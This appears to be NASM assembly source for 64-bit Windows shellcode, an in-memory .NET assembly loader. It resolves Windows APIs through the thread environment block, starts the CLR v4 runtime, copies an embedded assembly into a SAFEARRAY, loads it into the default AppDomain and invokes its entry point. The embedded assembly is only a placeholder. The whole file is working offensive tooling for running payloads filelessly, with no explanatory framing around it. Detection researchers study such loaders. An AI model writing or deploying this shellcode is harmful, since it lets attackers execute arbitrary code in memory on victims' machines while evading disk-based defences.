%include "sc-64-macros.asm"

%define RUNTIME_VERSION "v4.0.30319"

INDEX_KERNEL32_LOADLIBRARYA 			equ 0 * POINTERSIZE + STACKSPACE
INDEX_MSCOREE_CLRCREATEINSTANCE 		equ 1 * POINTERSIZE + STACKSPACE
INDEX_OLEAUT32_SAFEARRAYCREATE 			equ 2 * POINTERSIZE + STACKSPACE
INDEX_OLEAUT32_SAFEARRAYCREATEVECTOR 	equ 3 * POINTERSIZE + STACKSPACE
INDEX_OLEAUT32_SAFEARRAYACCESSDATA    	equ 4 * POINTERSIZE + STACKSPACE
INDEX_OLEAUT32_SAFEARRAYUNACCESSDATA  	equ 5 * POINTERSIZE + STACKSPACE
INDEX_OLEAUT32_VARIANTINIT 				equ 6 * POINTERSIZE + STACKSPACE
INDEX_KERNEL32_VIRTUALALLOC				equ 7 * POINTERSIZE + STACKSPACE
INDEX_KERNEL32_VIRTUALFREE 				equ 8 * POINTERSIZE + STACKSPACE

APIFUNCTIONCOUNT 				equ 9

struc SAFEARRAYBOUND
	.cElements resb 8
	.lLbound   resb 8
	.size:
endstruc

LOADLIBRARYA 	  	  equ 0x18
CLRCREATEINSTANCE 	  equ 0x20
SAFEARRAYCREATE   	  equ 0x28
SAFEARRAYCREATEVECTOR equ 0x30
SAFEARRAYACCESSDATA   equ 0x38
SAFEARRAYUNACCESSDATA equ 0x40
VARIANTINIT 		  equ 0x48
CLRMETAHOST  		  equ 0x50
CLRRUNTIMEINFO 		  equ 0x58
CLRRUNTIMEHOST 		  equ 0x60
CORRUNTIMEHOST 		  equ 0x68
APPDOMAINTHUNK 		  equ 0x70
APPDOMAIN 			  equ 0x78
SAFEDATA 			  equ 0x80
SAFEARRAY 			  equ 0x88
PASSEMBLY 			  equ 0x90
METHODINFO 			  equ 0x98
METHODARGS 			  equ 0x118
VARIANTOBJ 			  equ 0x128
SABSAFEARRAY 		  equ 0x138
VALLOC_SIZE 		  equ 0x300

segment .text
	
	; setup environment, reserve stack space
	sub rsp, STACKSPACE + ROUND_EVEN(APIFUNCTIONCOUNT) * POINTERSIZE

	; resolve VirtualAlloc
	mov rsi, [gs:0x30]
	add rsi, 0x28
	LOOKUP_API KERNEL32DLL, KERNEL32_VIRTUALALLOC, rsi

	; allocate memory
	xor rcx, rcx
	mov rdx, VALLOC_SIZE
	mov r8, 0x1000
	mov r9, 0x04
	call rax
	test eax,eax
	jz done

	; store address in TEB's ArbitraryUserPointer
	mov rsi, [gs:0x30]
	mov [rsi+0x28], rax

	; resolve LoadLibraryA
	mov rsi, [gs:0x28]	
	add rsi, LOADLIBRARYA
	LOOKUP_API KERNEL32DLL, KERNEL32_LOADLIBRARYA, rsi

	; load mscoree.dll
	lea rcx, [rel MSCOREEDLL]
	mov rsi, [gs:0x28]
	call [rsi+LOADLIBRARYA]

	; resolve CLRCreateInstance
	mov rsi, [gs:0x28]
	add rsi, CLRCREATEINSTANCE
	LOOKUP_API MSCOREEDLL, MSCOREE_CLRCREATEINSTANCE, rsi

	; load oleaut32.dll
	lea rcx, [rel OLEAUT32DLL]
	mov rsi, [gs:0x28]
	call [rsi+LOADLIBRARYA]

	; resolve oleaut32 functions
	mov rsi, [gs:0x28]
	add rsi, SAFEARRAYCREATE
	LOOKUP_API OLEAUT32DLL, OLEAUT32_SAFEARRAYCREATE, rsi

	mov rsi, [gs:0x28]
	add rsi, SAFEARRAYCREATEVECTOR
	LOOKUP_API OLEAUT32DLL, OLEAUT32_SAFEARRAYCREATEVECTOR, rsi

	mov rsi, [gs:0x28]
	add rsi, SAFEARRAYACCESSDATA
	LOOKUP_API OLEAUT32DLL, OLEAUT32_SAFEARRAYACCESSDATA, rsi

	mov rsi, [gs:0x28]
	add rsi, SAFEARRAYUNACCESSDATA
	LOOKUP_API OLEAUT32DLL, OLEAUT32_SAFEARRAYUNACCESSDATA, rsi

	mov rsi, [gs:0x28]
	add rsi, VARIANTINIT
	LOOKUP_API OLEAUT32DLL, OLEAUT32_VARIANTINIT, rsi

	; CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, &pCLRMetaHost)
	mov r8, [gs:0x28]
	add r8, CLRMETAHOST
	lea rdx, [rel IID_ICLRMetaHost]
	lea rcx, [rel CLSID_CLRMETAHOST]
	mov rsi, [gs:0x28]
	call [rsi+CLRCREATEINSTANCE]
	test eax,eax
	jnz done

	; pCLRMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (void**)&pCLRRuntimeInfo)
	mov rax, [gs:0x28]
	add rax, CLRMETAHOST
	mov rax, [rax]
	mov rax, [rax]
	mov r9, [gs:0x28]
	add r9, CLRRUNTIMEINFO
	lea r8, [rel IID_ICLRRUNTIMEINFO]
	lea rdx, [rel RUNTIME_VERSION_VALUE]
	mov rcx, [gs:0x28]
	add rcx, CLRMETAHOST
	mov rcx, [rcx]
	call [rax+0x18]
	test eax,eax
	jnz done

	; pCLRRuntimeInfo->GetInterface(CLSID_CorRuntimeHost,IID_ICorRuntimeHost, (void**)&pCorRuntimeHost)
	mov rax, [gs:0x28]
	add rax, CLRRUNTIMEINFO
	mov rax, [rax]
	mov rax, [rax]
	mov r9, [gs:0x28]
	add r9, CORRUNTIMEHOST
	lea r8, [rel IID_ICORRUNTIMEHOST]
	lea rdx, [rel CLSID_CORRUNTIMEHOST]
	mov rcx, [gs:0x28]
	add rcx, CLRRUNTIMEINFO
	mov rcx, [rcx]
	call [rax+0x48]
	test eax,eax
	jnz done

	; pCorRuntimeHost->Start()
	mov rax, [gs:0x28]
	add rax, CORRUNTIMEHOST
	mov rax, [rax]
	mov rax, [rax]
	mov rcx, [gs:0x28]
	add rcx, CORRUNTIMEHOST
	mov rcx, [rcx]
	call [rax+0x50]

	; pCorRuntimeHost->GetDefaultDomain(&pAppDomainThunk)
	mov rax, [gs:0x28]
	add rax, CORRUNTIMEHOST
	mov rax, [rax]
	mov rax, [rax]
	mov rdx, [gs:0x28]
	add rdx, APPDOMAINTHUNK
	mov rcx, [gs:0x28]
	add rcx, CORRUNTIMEHOST
	mov rcx, [rcx]
	call [rax+0x68]
	test eax,eax
	jnz done

	; pAppDomainThunk->QueryInterface(__uuidof(mscorlib::_AppDomain), (void**)&pAppDomain)
	mov rax, [gs:0x28]
	add rax, APPDOMAINTHUNK
	mov rax, [rax]
	mov rax, [rax]
	mov r8, [gs:0x28]
	add r8, APPDOMAIN
	lea rdx, [rel CLSID_APPDOMAIN]
	mov rcx, [gs:0x28]
	add rcx, APPDOMAINTHUNK
	mov rcx, [rcx]
	call [rax]
	test eax,eax
	jnz done

	; safeArrayBound->cElements = ASSEMBLY_LENGTH;
	mov rsi, [gs:0x28]
	add rsi, SABSAFEARRAY
	mov [rsi+SAFEARRAYBOUND.cElements], dword ASSEMBLY_LENGTH

	; safeArrayBound->lLbound = 0
	mov [rsi+SAFEARRAYBOUND.lLbound], byte 0

	; pSafeArray = SafeArrayCreate(VT_UI1, 1, safeArrayBound);
	mov r8, [gs:0x28]
	add r8, SABSAFEARRAY
	mov edx, 1
	mov cx, 0x11
	mov rsi, [gs:0x28]
	call [rsi+SAFEARRAYCREATE]
	test eax,eax
	jz done
	mov rsi, [gs:0x28]
	mov [rsi+SAFEARRAY], rax
	
	; SafeArrayAccessData(pSafeArray, &lpSafeData)
	mov rdx, [gs:0x28]
	add rdx, SAFEDATA
	mov rcx, [gs:0x28]
	add rcx, SAFEARRAY
	mov rcx, [rcx]
	mov rsi, [gs:0x28]
	call [rsi + SAFEARRAYACCESSDATA]
	test eax,eax
	jnz done

	; memcpy(lpSafeData, ASSEMBLY, ASSEMBLY_LENGTH)
	mov rax, [gs:0x28]
	mov rdi, rax
	add rdi, SAFEDATA
	mov rdi, [rdi]
	lea rsi, [rel ASSEMBLY]
	mov rcx, dword ASSEMBLY_LENGTH
	rep movsb

	; SafeArrayUnaccessData(pSafeArray)
	mov rcx, [gs:0x28]
	add rcx, SAFEARRAY
	mov rcx, [rcx]
	mov rdi, [gs:0x28]
	call [rdi + SAFEARRAYUNACCESSDATA]
	test eax,eax
	jnz done

	; pAppDomain->Load_3(pSafeArray, &pAssembly)
	mov rax, [gs:0x28]
	add rax, APPDOMAIN
	mov rax, [rax]
	mov rax, [rax]
	mov r8, [gs:0x28]
	add r8, PASSEMBLY
	mov rdx, [gs:0x28]
	add rdx, SAFEARRAY
	mov rdx, [rdx]
	mov rcx, [gs:0x28]
	add rcx, APPDOMAIN
	mov rcx, [rcx]
	call [rax+0x168]
	test eax,eax
	jnz done

	; pMethodArgs = _SafeArrayCreateVector(VT_VARIANT, 0, 1);
	mov r8, 1
	xor rdx,rdx
	mov rcx, 0x0c
	mov rsi, [gs:0x28]
	call [rsi+SAFEARRAYCREATEVECTOR]
	test eax,eax
	jz done
	mov rdx, [gs:0x28]
	mov [rdx+METHODARGS], rax

	; pAssembly->get_EntryPoint(&mMethodInfo)
	mov rax, [gs:0x28]
	add rax, PASSEMBLY
	mov rax, [rax]
	mov rax, [rax]
	mov rdx, [gs:0x28]
	add rdx, METHODINFO
	mov rcx, [gs:0x28]
	add rcx, PASSEMBLY
	mov rcx, [rcx]
	call [rax+0x80]
	test eax,eax
	jnz done

	; VariantInit(&obj)
	mov rcx, [gs:0x28]
	add rcx, VARIANTOBJ
	mov rdi, [gs:0x28]
	call [rdi + VARIANTINIT]

	; mMethodInfo->Invoke_3(obj, pMethodArgs, NULL);
	mov rax, [gs:0x28]
	add rax, METHODINFO
	mov rax, [rax]
	mov rax, [rax]
	xor r9, r9
	mov r8, [gs:0x28]
	add r8, METHODARGS
	mov r8, [r8]
	mov rdx, [gs:0x28]
	add rdx, VARIANTOBJ
	mov rcx, [gs:0x28]
	add rcx, METHODINFO
	mov rcx, [rcx]
	call [rax+0x128]

	; resolve VirtualFree and free memory
	mov rsi, [gs:0x28]
	push rsi
	LOOKUP_API KERNEL32DLL, KERNEL32_VIRTUALFREE, rsi

	pop rcx
	mov rdx, VALLOC_SIZE
	mov r8, 0x4000
	call rax

	add rsp, STACKSPACE + ROUND_EVEN(APIFUNCTIONCOUNT) * POINTERSIZE
	ret

done:
	add rsp, STACKSPACE + ROUND_EVEN(APIFUNCTIONCOUNT) * POINTERSIZE
	ret

%include "sc-64-api-functions.asm"

CLSID_CLRMETAHOST:
db 0x8d,0x18,0x80,0x92,0x8e,0x0e,0x67,0x48,0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde
IID_ICLRMetaHost:
db 0x9e,0xdb,0x32,0xd3,0xb3,0xb9,0x25,0x41,0x82,0x07,0xa1,0x48,0x84,0xf5,0x32,0x16
IID_ICLRRUNTIMEINFO:
db 0xd2,0xd1,0x39,0xbd,0x2f,0xba,0x6a,0x48,0x89,0xb0,0xb4,0xb0,0xcb,0x46,0x68,0x91
IID_ICORRUNTIMEHOST:
db 0x22,0x67,0x2f,0xcb,0x3a,0xab,0xd2,0x11,0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e
CLSID_CORRUNTIMEHOST:
db 0x23,0x67,0x2f,0xcb,0x3a,0xab,0xd2,0x11,0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e
CLSID_APPDOMAIN:
db 0xdc,0x96,0xf6,0x05,0x29,0x2b,0x63,0x36,0xad,0x8b,0xc4,0x38,0x9c,0xf2,0xa7,0x13

RUNTIME_VERSION_VALUE:
	db __utf16__(RUNTIME_VERSION), 0, 0

sabSafeArray:  RESB SAFEARRAYBOUND.size

KERNEL32DLL 					db "KERNEL32.DLL", 0
KERNEL32_LOADLIBRARYA			db "LoadLibraryA", 0
KERNEL32_VIRTUALALLOC 			db "VirtualAlloc", 0
KERNEL32_VIRTUALFREE 			db "VirtualFree", 0

MSCOREEDLL  					db "MSCOREE.DLL", 0
MSCOREE_CLRCREATEINSTANCE 		db "CLRCreateInstance", 0

OLEAUT32DLL 					db "OLEAUT32.DLL", 0
OLEAUT32_SAFEARRAYCREATE 		db "SafeArrayCreate", 0
OLEAUT32_SAFEARRAYCREATEVECTOR 	db "SafeArrayCreateVector", 0
OLEAUT32_SAFEARRAYACCESSDATA    db "SafeArrayAccessData", 0
OLEAUT32_SAFEARRAYUNACCESSDATA  db "SafeArrayUnaccessData", 0
OLEAUT32_VARIANTINIT 			db "VariantInit", 0

ASSEMBLY_LENGTH equ 1094795585
ASSEMBLY:
db 0x00